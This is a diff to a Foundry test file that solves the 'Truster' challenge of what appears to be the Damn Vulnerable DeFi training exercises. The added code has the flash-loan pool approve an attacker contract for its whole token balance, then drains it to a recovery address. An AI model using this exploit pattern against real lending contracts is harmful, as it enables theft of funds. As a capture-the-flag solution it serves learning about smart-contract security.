@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {FlashLoanReceiver} from "../../src/truster/FlashLoanReceiver.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -51,7 +52,15 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        console.log("pool balance: ", token.balanceOf(address(pool)));
+        console.log("recovery balance: ", token.balanceOf(recovery));
+
+        FlashLoanReceiver receiver = new FlashLoanReceiver(address(pool), address(token), player);
+        bytes memory data = abi.encodeCall(token.approve, (address(receiver), token.balanceOf(address(pool))));
+        receiver.attack(data, recovery);
+
+        console.log("pool balance: ", token.balanceOf(address(pool)));
+        console.log("recovery balance: ", token.balanceOf(recovery));
     }
 
     /**
